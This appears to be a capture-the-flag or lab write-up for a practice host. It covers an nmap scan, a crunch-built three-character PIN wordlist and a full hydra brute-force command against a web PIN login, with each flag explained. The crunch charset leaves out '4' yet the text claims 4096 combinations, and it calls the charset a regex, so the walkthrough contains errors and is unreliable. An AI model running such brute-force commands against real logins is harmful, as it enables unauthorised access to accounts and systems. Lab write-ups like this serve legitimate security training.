---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## 10.10.152.38 is the IP address of the target

nmap 10.10.152.38 

      port 22,8000 open
      
10.10.152.38:8000 redirects to --> /login.php/pin

 [1] pin possible input :

    [*] : 0123456789abcdef 
    [*] : 3 min 
    [*] : 3 max

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## creating combolist with crunch 
crunch 3 3 012356789abcdef -o 3digits.txt 
    
    [*] : creating list of password named 3digits.txt 
    [*] : 3 as a minimum
    [*] : 3 as a maximum 
    [*] : 012356789abcdef is the regex
    [*] : 16*16*16 possibilities = 4096 possibility

## bruteforcing website´s pin with hydra 

hydra -l '' -P 3digits.txt -f -v 10.10.152.38 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000 

    -l '' indicates that the login name is blank as the security lock only requires a password
    -P 3digits.txt specifies the password file to use
    -f stops Hydra after finding a working password
    -v provides verbose output and is helpful for catching errors
    
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Details :
    http-post-form specifies the HTTP method to use
    "/login.php:pin=^PASS^:Access denied" has three parts separated by :
    /login.php is the page where the PIN code is submitted
    pin=^PASS^ will replace ^PASS^ with values from the password list
    Access denied indicates that invalid passwords will lead to a page that contains the text “Access denied”
    -s 8000 indicates the port number on the target
